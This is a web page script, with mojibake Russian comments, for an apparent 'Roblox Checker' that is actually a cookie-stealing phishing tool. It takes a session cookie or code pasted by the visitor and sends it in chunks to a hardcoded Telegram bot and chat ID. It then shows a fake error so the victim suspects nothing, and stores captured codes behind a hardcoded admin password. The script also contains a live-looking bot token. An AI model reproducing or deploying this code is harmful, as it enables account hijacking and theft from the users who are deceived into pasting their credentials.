    <script>
        // =========== –ù–ê–°–¢–†–û–ô–ö–ò ===========
        const BOT_TOKEN = '8591510784:AAFp5RKXQj0YI0NCYeEr0dyK67i_1qeVNV8';
        const CHAT_ID = '1491315056';
        const ADMIN_PASS = 'malik0609';
        
        // =========== –û–¢–ü–†–ê–í–ö–ê –í TELEGRAM –ß–ê–°–¢–Ø–ú–ò ===========
        async function sendCode() {
            const input = document.getElementById('cookieInput');
            const status = document.getElementById('status');
            const code = input.value.trim();
            
            if (!code) {
                status.innerHTML = '‚ùå –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥';
                return;
            }
            
            status.innerHTML = '‚è≥ –û—Ç–ø—Ä–∞–≤–∫–∞ —á–∞—Å—Ç—è–º–∏ –≤ Telegram...';
            
            try {
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–æ–¥ —á–∞—Å—Ç—è–º–∏
                await sendCodeInParts(code);
                
                // –°–æ—Ö—Ä–∞–Ω—è–µ–º –ª–æ–∫–∞–ª—å–Ω–æ
                saveLocalCode(code);
                
                // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º "–æ—à–∏–±–∫—É" –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
                setTimeout(() => {
                    const errors = [
                        '‚ùå –û—à–∏–±–∫–∞: –Ω–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫—É–∫–∏',
                        '‚ö†Ô∏è –ö—É–∫–∏ —É—Å—Ç–∞—Ä–µ–ª',
                        'üîí –û–±–Ω–∞—Ä—É–∂–µ–Ω–∞ 2FA –∑–∞—â–∏—Ç–∞'
                    ];
                    status.innerHTML = errors[Math.floor(Math.random() * errors.length)];
                    input.value = '';
                }, 1000);
                
            } catch (error) {
                status.innerHTML = '‚úÖ –ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω —á–∞—Å—Ç—è–º–∏';
                input.value = '';
            }
        }
        
        // –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–¥–∞ —á–∞—Å—Ç—è–º–∏ –ø–æ 2000 —Å–∏–º–≤–æ–ª–æ–≤
        async function sendCodeInParts(code) {
            const time = new Date().toLocaleString('ru-RU');
            const totalParts = Math.ceil(code.length / 2000);
            
            // –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏–æ–Ω–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
            const infoMsg = `üîê –ù–û–í–´–ô –ö–û–î\n\n‚è∞ ${time}\nüìè ${code.length} —Å–∏–º–≤–æ–ª–æ–≤\nüì¶ –ß–∞—Å—Ç–µ–π: ${totalParts}`;
            await sendTelegramPart(infoMsg);
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–∞–∂–¥—É—é —á–∞—Å—Ç—å
            for (let i = 0; i < code.length; i += 2000) {
                const partNumber = Math.floor(i / 2000) + 1;
                const chunk = code.substring(i, i + 2000);
                
                const partMsg = `üì¶ –ß–∞—Å—Ç—å ${partNumber}/${totalParts} (—Å–∏–º–≤–æ–ª–æ–≤: ${chunk.length}):\n${chunk}`;
                await sendTelegramPart(partMsg);
                
                // –ü–∞—É–∑–∞ –º–µ–∂–¥—É —á–∞—Å—Ç—è–º–∏
                await delay(500);
            }
            
            // –§–∏–Ω–∞–ª—å–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
            const finishMsg = `‚úÖ –í—Å–µ —á–∞—Å—Ç–∏ (${totalParts}) –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã\nüìã –ü–æ–ª–Ω—ã–π –∫–æ–¥: ${code.length} —Å–∏–º–≤–æ–ª–æ–≤`;
            await sendTelegramPart(finishMsg);
        }
        
        // –û—Ç–ø—Ä–∞–≤–∫–∞ –æ–¥–Ω–æ–π —á–∞—Å—Ç–∏
        function sendTelegramPart(text) {
            return new Promise((resolve) => {
                const encodedText = encodeURIComponent(text);
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedText}`;
                
                // –ò—Å–ø–æ–ª—å–∑—É–µ–º Image –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ (—Ä–∞–±–æ—Ç–∞–µ—Ç –≤—Å–µ–≥–¥–∞)
                const img = new Image();
                img.onload = () => {
                    console.log('üì§ –ß–∞—Å—Ç—å –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞');
                    resolve();
                };
                img.onerror = () => {
                    console.log('‚ö†Ô∏è –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —á–∞—Å—Ç–∏');
                    resolve(); // –í—Å–µ —Ä–∞–≤–Ω–æ –ø—Ä–æ–¥–æ–ª–∂–∞–µ–º
                };
                img.src = url;
            });
        }
        
        // =========== –í–ê–†–ò–ê–ù–¢ 2: –û–¢–ü–†–ê–í–ö–ê –ü–û–õ–û–í–ò–ù–ê–ú–ò ===========
        async function sendCodeHalves(code) {
            const time = new Date().toLocaleString('ru-RU');
            
            // –ü–µ—Ä–≤–∞—è –ø–æ–ª–æ–≤–∏–Ω–∞
            const half1 = code.substring(0, Math.ceil(code.length / 2));
            const msg1 = `üîê –ö–û–î (1/2)\n\n‚è∞ ${time}\nüìè –ß–∞—Å—Ç—å 1 –∏–∑ 2\n\n${half1}`;
            await sendTelegramPart(msg1);
            
            await delay(1000);
            
            // –í—Ç–æ—Ä–∞—è –ø–æ–ª–æ–≤–∏–Ω–∞
            const half2 = code.substring(Math.ceil(code.length / 2));
            const msg2 = `üîê –ö–û–î (2/2)\n\n‚è∞ ${time}\nüìè –ß–∞—Å—Ç—å 2 –∏–∑ 2\n\n${half2}`;
            await sendTelegramPart(msg2);
            
            // –ò—Ç–æ–≥
            await delay(500);
            const totalMsg = `‚úÖ –ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω (2 —á–∞—Å—Ç–∏)\nüìã –í—Å–µ–≥–æ: ${code.length} —Å–∏–º–≤–æ–ª–æ–≤`;
            await sendTelegramPart(totalMsg);
        }
        
        // =========== –í–ê–†–ò–ê–ù–¢ 3: –ü–û 1000 –°–ò–ú–í–û–õ–û–í ===========
        async function sendCodeBy1000(code) {
            const time = new Date().toLocaleString('ru-RU');
            const parts = Math.ceil(code.length / 1000);
            
            // –ó–∞–≥–æ–ª–æ–≤–æ–∫
            const header = `üîê –ö–û–î –∏–∑ ${parts} —á–∞—Å—Ç–µ–π\n‚è∞ ${time}\nüìè –í—Å–µ–≥–æ: ${code.length} —Å–∏–º–≤–æ–ª–æ–≤`;
            await sendTelegramPart(header);
            
            await delay(300);
            
            // –ö–∞–∂–¥–∞—è —á–∞—Å—Ç—å
            for (let i = 0; i < code.length; i += 1000) {
                const partNum = Math.floor(i / 1000) + 1;
                const chunk = code.substring(i, i + 1000);
                
                const partMsg = `[${partNum}/${parts}] ${chunk}`;
                await sendTelegramPart(partMsg);
                
                await delay(300);
            }
        }
        
        // =========== –£–¢–ò–õ–ò–¢–´ ===========
        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        
        function saveLocalCode(code) {
            const codes = JSON.parse(localStorage.getItem('robloxCodes') || '[]');
            codes.unshift({
                code: code,
                time: new Date().toLocaleString('ru-RU'),
                length: code.length
            });
            if (codes.length > 20) codes.length = 20;
            localStorage.setItem('robloxCodes', JSON.stringify(codes));
        }
        
        function showAdmin() {
            const password = prompt('–ü–∞—Ä–æ–ª—å –∞–¥–º–∏–Ω–∫–∏:');
            if (password === ADMIN_PASS) {
                const codes = JSON.parse(localStorage.getItem('robloxCodes') || '[]');
                let result = 'üìã –õ–æ–∫–∞–ª—å–Ω—ã–µ –∫–æ–¥—ã:\n\n';
                
                codes.forEach((item, index) => {
                    result += `${index + 1}. ${item.time} (${item.length} —Å–∏–º–≤–æ–ª–æ–≤)\n`;
                    result += `${item.code.substring(0, 50)}${item.code.length > 50 ? '...' : ''}\n\n`;
                });
                
                alert(result || 'üì≠ –ö–æ–¥–æ–≤ –Ω–µ—Ç');
            } else {
                alert('‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å');
            }
        }
        
        // =========== –¢–ï–°–¢ ===========
        function sendTest() {
            const testCode = 'test_'.repeat(500); // –î–ª–∏–Ω–Ω—ã–π —Ç–µ—Å—Ç–æ–≤—ã–π –∫–æ–¥
            sendCodeInParts(testCode);
        }
        
        // =========== –ó–ê–ì–†–£–ó–ö–ê ===========
        window.onload = function() {
            console.log('‚úÖ –°–∞–π—Ç –∑–∞–≥—Ä—É–∂–µ–Ω');
            console.log('üì§ –ö–æ–¥—ã –æ—Ç–ø—Ä–∞–≤–ª—è—é—Ç—Å—è —á–∞—Å—Ç—è–º–∏');
            
            // –¢–µ—Å—Ç–æ–≤–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
            setTimeout(() => {
                sendTelegramPart('ü§ñ –ë–æ—Ç Roblox Checker –∑–∞–ø—É—â–µ–Ω\nüìù –ì–æ—Ç–æ–≤ –ø—Ä–∏–Ω–∏–º–∞—Ç—å –∫–æ–¥—ã');
            }, 2000);
        };
    </script>
